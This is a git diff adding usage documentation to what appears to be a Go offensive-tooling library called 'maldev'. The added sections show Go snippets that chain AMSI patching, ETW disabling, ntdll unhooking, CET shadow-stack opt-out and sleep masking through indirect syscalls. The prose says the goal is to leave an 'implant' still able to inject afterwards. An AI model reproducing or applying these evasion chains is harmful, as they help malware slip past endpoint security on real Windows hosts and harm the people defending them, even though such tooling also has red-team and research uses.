@@ -172,6 +172,40 @@ func main() {
 }
 ```
 
+### Hardened — Win11 24H2+ with CET shadow stacks
+
+Sweet spot when the host enforces CET: AMSI + ETW + full ntdll
+unhook + CET opt-out, no irreversible per-process mitigations
+(ACG, BlockDLLs) so the implant can still inject after the
+preset runs.
+
+```go
+import (
+    "github.com/oioio-space/maldev/evasion"
+    "github.com/oioio-space/maldev/evasion/preset"
+    wsyscall "github.com/oioio-space/maldev/win/syscall"
+)
+
+func main() {
+    caller := wsyscall.New(wsyscall.MethodIndirectAsm, wsyscall.NewHashGate())
+    defer caller.Close()
+    errs := evasion.ApplyAll(preset.Hardened(), caller)
+    _ = errs
+}
+```
+
+### `CETOptOut` standalone — pluck the technique into a custom stack
+
+```go
+stack := []evasion.Technique{
+    amsi.ScanBufferPatch(),
+    etw.All(),
+    preset.CETOptOut(), // no-op when cet.Enforced() == false
+    sleepmask.NewLocalForCurrentImage(),
+}
+_ = evasion.ApplyAll(stack, caller)
+```
+
 ### With indirect syscalls (Caller)
 
 ```go
